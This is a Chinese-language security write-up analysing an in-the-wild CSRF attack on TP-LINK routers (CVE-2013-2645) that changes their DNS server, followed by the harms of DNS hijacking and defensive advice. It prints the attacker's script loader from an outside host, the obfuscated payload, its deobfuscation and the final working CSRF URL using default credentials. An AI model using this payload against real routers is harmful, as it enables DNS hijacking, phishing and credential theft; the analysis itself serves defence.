# 针对TP-LINK的CSRF攻击来劫持DNS案例

0x00 背景
-------

* * *

路由被CSRF攻击，修改DNS的话题最近一直比较活跃，但是国内貌似没有一个技术文章详细的分析此漏洞，漏洞成因比较简单，本篇来科普一下。

本篇讲得是一个利用CVE-2013-2645的漏洞，来修改TP-LINK的DNS案例，针对其他路由的攻击大同小异。

0x01 EXP分析
----------

* * *

攻击者会在自己的网站或者已经受他控制的网站上加入一段javascript代码：

```
document.write("<script type=\"text/javascript\" src=\"http://www.xxxxxx.com/js/ma.js\">");

```

javascript代码动态的从外站加载一个ma.js的文件，看一下ma.js文件里的内容：

```
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c][/c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c][/c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c][/c]);return p;}('T w$=["\\E\\6\\5\\m\\o\\3\\q\\5\\m\\8\\3\\7\\"\\5\\3\\G\\5\\j\\r\\6\\6\\"\\y\\B\\d\\e\\8\\v\\4\\5\\q\\u\\4\\o\\H\\n\\5\\5\\8\\A\\j\\j\\a\\i\\e\\d\\f\\A\\a\\i\\e\\d\\f\\B\\2\\k\\h\\1\\2\\g\\9\\1\\2\\1\\2\\j\\u\\6\\3\\4\\z\\8\\e\\j\\s\\a\\f\\F\\n\\r\\8\\C\\3\\4\\l\\3\\4\\z\\8\\e\\1\\n\\5\\e\\I\\i\\n\\r\\8\\6\\3\\4\\l\\3\\4\\7\\2\\c\\d\\8\\2\\7\\2\\k\\h\\1\\2\\g\\9\\1\\2\\1\\2\\b\\b\\c\\d\\8\\h\\7\\2\\k\\h\\1\\2\\g\\9\\1\\2\\1\\2\\k\\k\\c\\s\\3\\a\\6\\3\\7\\2\\h\\b\\c\\Q\\a\\5\\3\\x\\a\\m\\7\\b\\1\\b\\1\\b\\1\\b\\c\\i\\v\\e\\a\\d\\f\\7\\c\\i\\f\\6\\6\\3\\4\\l\\3\\4\\7\\2\\b\\g\\1\\2\\9\\P\\1\\D\\g\\1\\9\\R\\c\\i\\f\\6\\6\\3\\4\\l\\3\\4\\h\\7\\9\\1\\9\\1\\9\\1\\9\\c\\C\\a\\l\\3\\7\\p\\t\\2\\p\\S\\D\\O\\p\\t\\K\\p\\J\\g\\L\\N\\E\\j\\6\\5\\m\\o\\3\\y\\q"];M["\\x\\4\\d\\5\\3\\o\\f"](w$[0]);',56,56,'|x2e|x31|x65|x72|x74|x73|x3d|x70|x38|x61|x30|x26|x69|x6d|x6e|x36|x32|x64|x2f|x39|x76|x79|x68|x6c|x25|x20|x63|x4c|x42|x75|x6f|_|x77|x3e|x52|x3a|x40|x53|x33|x3c|x44|x78|x28|x3f|x45|x34|x29|document|x3b|x2b|x37|x67|x35|x41|var'.split('|'),0,{}))

```

嗯，是一段混淆的js代码，eval执行一段混淆代码，把eval换成console.log在浏览器的控制台输出一下：

```
var _$=["\x3c\x73\x74\x79\x6c\x65\x20\x74\x79\x70\x65\x3d\"\x74\x65\x78\x74\x2f\x63\x73\x73\"\x3e\x40\x69\x6d\x70\x6f\x72\x74\x20\x75\x72\x6c\x28\x68\x74\x74\x70\x3a\x2f\x2f\x61\x64\x6d\x69\x6e\x3a\x61\x64\x6d\x69\x6e\x40\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x2f\x75\x73\x65\x72\x52\x70\x6d\x2f\x4c\x61\x6e\x44\x68\x63\x70\x53\x65\x72\x76\x65\x72\x52\x70\x6d\x2e\x68\x74\x6d\x3f\x64\x68\x63\x70\x73\x65\x72\x76\x65\x72\x3d\x31\x26\x69\x70\x31\x3d\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x30\x30\x26\x69\x70\x32\x3d\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x39\x39\x26\x4c\x65\x61\x73\x65\x3d\x31\x32\x30\x26\x67\x61\x74\x65\x77\x61\x79\x3d\x30\x2e\x30\x2e\x30\x2e\x30\x26\x64\x6f\x6d\x61\x69\x6e\x3d\x26\x64\x6e\x73\x73\x65\x72\x76\x65\x72\x3d\x31\x30\x36\x2e\x31\x38\x37\x2e\x33\x36\x2e\x38\x35\x26\x64\x6e\x73\x73\x65\x72\x76\x65\x72\x32\x3d\x38\x2e\x38\x2e\x38\x2e\x38\x26\x53\x61\x76\x65\x3d\x25\x42\x31\x25\x41\x33\x2b\x25\x42\x34\x25\x45\x36\x29\x3b\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x20"];document["\x77\x72\x69\x74\x65\x6c\x6e"](_$[0]);

```

仍然是混淆的代码，但是比一开始的容易看很多，只是把一些字符串给转成了16进制方式表示而已。

`\x77\x72\x69\x74\x65\x6c\x6e`这段16进制表示的是字符串`writeln`。

javascript中`document["writeln"]`与document.writeln一样，这是javascript两种访问对象属性的写法。

代码最终等同于：

```
document.writeln('<style type="text/css">@import url(http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=106.187.36.85&dnsserver2=8.8.8.8&Save=%B1%A3+%B4%E6);</style>')

```

现在就很明了了，写了一个style标签import一个css调用，让浏览器去访问这个地址：

```
http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=106.187.36.85&dnsserver2=8.8.8.8&Save=%B1%A3+%B4%E6

```

很明显的一个CSRF攻击，攻击者的主要目的是把dns服务器换成106.187.36.85，为了使攻击成功，还加入了一些必要的提交参数，如ip范围是从192.168.1.100-199等。

为了确保所有访问都没有问题，还加入了google的dns，当106.187.36.85有不能解析的域名时，去8.8.8.8获取地址。

针对CSRF的原理危害以及修复方式，drops之前有文章讲过可以参考一下：

[CSRF简单介绍及利用方法](http://drops.wooyun.org/papers/155)

应当注意的是这个利用是根据路由的默认密码进入后台做一系列的操作的，如果路由器已经修改的默认用户名密码，可以避免此危害，但是如果浏览器已经在路由后台，或者cookie还未失效，仍然能够攻击成功。

0x02 修改DNS的危害
-------------

* * *

攻击者为什么要修改DNS呢，当他获取DNS的权限后，他能做什么呢：

```
1、用户打开一个正常网站时，重定向到一个钓鱼网站。
2、给正常网站加入挂马代码，控制用户PC。
3、软件升级时候不用签名的话，可控制软件的升级。
4、不使用证书的话可以截取邮箱密码，网站上的密码等等。
5、更改网站上的广告，换成自己的。（我觉得这是天朝黑客获取利润的方式）

```

0x03 如何避免这种攻击
-------------

* * *

```
1、首先应该先检查一下自己的dns是否已经被改变了。
2、升级路由的固件，有部分型号已经修复。
3、更改路由器的默认密码。
4、登陆路由后，退出要点击“注销”。
```